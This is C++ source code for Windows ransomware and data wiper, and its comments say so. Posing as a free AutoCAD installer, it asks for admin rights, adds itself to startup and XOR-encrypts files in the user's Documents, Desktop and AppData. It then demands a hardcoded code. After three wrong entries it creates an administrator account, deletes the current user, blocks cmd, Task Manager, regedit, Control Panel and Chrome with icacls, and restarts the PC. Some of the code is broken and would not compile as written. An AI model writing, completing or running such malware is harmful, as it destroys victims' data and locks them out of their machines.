#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <windows.h>
#include <tlhelp32.h>

using namespace std;
namespace fs = std::filesystem;

const string xorKey = "errorfatal0x00";
const string decryptKey = "errorfatal0x00";
const string browserAUMID = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
const int maxChances = 3;

void addToStartup();
void xorEncryptDecryptFile(const string& filePath, const string& key);
void createNewAccount(const string& username, const string& password);
void addAccountToAdminGroup(const string& username);
void deleteCurrentUser (const string& username);
void restartPC();
void encryptFilesFromDirectories(const vector<string>& directories);
bool checkDecryptKey(const string& inputKey);
void setDefaultBrowser(const string& browserAUMID);
void showPopupMessage(const string& message);
void restrictAdminApps();

int main() {
    //this will ask for admin
    RequestAdminPrivileges();
    
    //This will make the program set itself as a startup program
    addToStartup();

    // The program will start as a ransomware using this code below
    // This is the main part of the ransomware
    vector<string> directories = {
        getenv("USERPROFILE") + string("\\Documents"),
        getenv("USERPROFILE") + string("\\Desktop"),
        getenv("USERPROFILE") + string("\\AppData")
    }; //This will encrypt all files in the user's documents and desktop directories and renders the user's appdata unusable

    encryptFilesFromDirectories(directories);
    cout << "Oops, it looks like all of your files got encrypted. Please contact the website and enter the code that'll be sent to get your files back." << endl;

    // Now we will ask for the code that I've hardcoded
    string inputKey;
    int chances = 0;

    while (chances < maxChances) {
        cout << "Please enter the code: ";
        cin >> inputKey;

        if (checkDecryptKey(inputKey)) {
            //if the key is correct...
            cout << "Restoring your files, this may take a while" << endl;
            encryptFilesFromDirectories(directories); //the function will be reused to decrypt the files
            cout << "Your files have been restored! Please remove the app from the startup menu restart your computer to complete the process" << endl;

            return 0; // this will exit the program
        } else {
            //If the key is incorrect
            chances++;
            cout << "Incorrect code,stop guessing, you have " << maxChances - chances << " chances left" << endl;

            if (chances >= maxChances) {
                //this will tell the user that all of their files are gone and become a data wiper
                cout << "You have used up all of your chances, all of your files are gone. Even Microsoft themselves couldn't fix it" << endl;

                // this will create a new account with stricter rules
                string newUsername = "BANNED FROM WINDOWS";
                string newPassword = "NoAccessToWindows";
                createNewAccount(newUsername, newPassword);
                addAccountToAdminGroup(newUsername); //this will make the new account an admin

                //this will set the browser to something like: Microsoft Edge
                setDefaultBrowser("Microsoft.MicrosoftEdge_8wekyb3d8bbwe");

                //this will delete the current user and all of their files, and restart their pc
                const char* usernameEnv = getenv("USERNAME");
                if (usernameEnv != nullptr){
                    deleteCurrentUser (usernameEnv); //if it is safe to use
                } else {
                    cerr << "WHAT?! THAT'S NOT POSSIBLE, IT COULD BE BECAUSE OF YOUR BUGGY PC" << endl;
                    return; //this will exit the program
                }
                
                restrictAdminApps(); //this will ban access to some system apps + chrome

                restartPC(); //this will restart the pc
            }
        }
    }

    return 0;
}

void RequestAdminPrivileges() {
    //this will check for admin privileges
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2,
    SECURITY_BUILTIN_DOMAIN_RID,
    DOMAIN_ALIAS_RID_ADMINS,
    0, 0, 0, 0, 0, 0,
    &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }

    if (!isAdmin) {
        //if the program is not running as admin, it will ask the user to run it as admin
        ShellExecute(NULL, L"runas", L"freeAutodeskAutocadSetup.exe", NULL, NULL, SW_SHOWNORMAL);
        exit(0); // exit the current instance
        }
}

void addToStartup() {
    //This will add the program to the startup menu
    string appPath = "freeAutodeskAutoCad2024Setup.exe";
    string startupPath = getenv("APPDATA");
    startupPath += "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

    //this will create a new shortcut to the program in the startup menu
    string command = "mklink \"" + startupPath + "freeAutodeskAutocad2024Setup.lnk\" \"" + appPath + "\""; //create a sybolic link
    system(command.c_str());
}

void xorEncryptDecryptFile(const string& filePath, const string& key) {
    //this will open the file and read it
    ifstream inputFile(filePath, ios::binary);
    if (!inputFile) {
        cerr << "Error opening file:" << filePath << endl;
        return;
    }

    //create an output file
    ofstream outputFile(filePath + ".enc", ios::binary);
    if (!outputFile) {
        cerr <<"Error creating encrypted file:" << filePath + ".enc" << endl;
        return;
    }

        char buffer;
    size_t keyLength = key.size();
    size_t i = 0;

    while (inputFile.get(buffer)) {
        buffer ^= key[i % keyLength]; // XOR encryption/decryption
        outputFile.put(buffer);
        i++;
    }

    inputFile.close();
    outputFile.close();
}

void createNewAccount(const string& username, const string& password) {
    string command = "net user " + username + " " + password + " /add";
    system(command.c_str());
}

void addAccountToAdminGroup(const string& username) {
    string command = "net localgroup Administrators " + username + " /add";
    system(command.c_str());
}

void deleteCurrentUser (const string& username) {
    string command = "net user " + username + " /delete";
    system(command.c_str());
}

void restartPC() {
    system("shutdown /r /t 0");
}

void encryptFilesFromDirectories(const vector<string> & directories) {
    for (const string& dir : directories) {
        for (const auto& entry : fs::directory_iterator(dir)) {
            if (fs::is_regular_file(entry.path())) {
                string filePath = entry.path().string();
                xorEncryptDecryptFile(filePath, xorKey);
            }
        }
    }
}
bool checkDecryptKey(const string& inputKey) {
    return inputKey == decryptKey; // Check if the input key matches the hardcoded key
}

void setDefaultBrowser(const string& browserAUMID) {
    // Command to set Edge as the default browser
    string command = "powershell -Command \"& {Set-DefaultBrowser -Browser -BrowserAUMID '" + browserAUMID + "'}\"";
    system(command.c_str());
    cout << "NOW LET'S SET THE DEFAULT BROWSER TO EDGE, AND YOU WILL NO LONGER BE ABLE TO USE ANY OTHER BROWSER" << endl;
}

void showPopupMessage(const string& message) {
    MessageBoxA(NULL, message.c_str(), "Notification", MB_OK | MB_ICONINFORMATION);
}

void restrictAdminApps() {
    // Example of restricting access to certain applications
    // This can be done by modifying permissions or using Group Policy
    // Here we can use a simple command to deny access to certain apps
    system("icacls \"C:\\Windows\\System32\\control.exe\" /deny Everyone:(X)");
    system("icacls \"C:\\Windows\\System32\\taskmgr.exe\" /deny Everyone:(X)");
    system("icacls \"C:\\Windows\\System32\\regedit.exe\" /deny Everyone:(X)");
    system("icacls \"C:\\Windows\\System32\\cmd.exe\" /deny Everyone:(X)");
    system("icacls \"C:\\Program Files\\WindowsApps\\settings.exe\" /deny Everyone:(X)");
    system("icacls \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" /deny Everyone:(X)");
}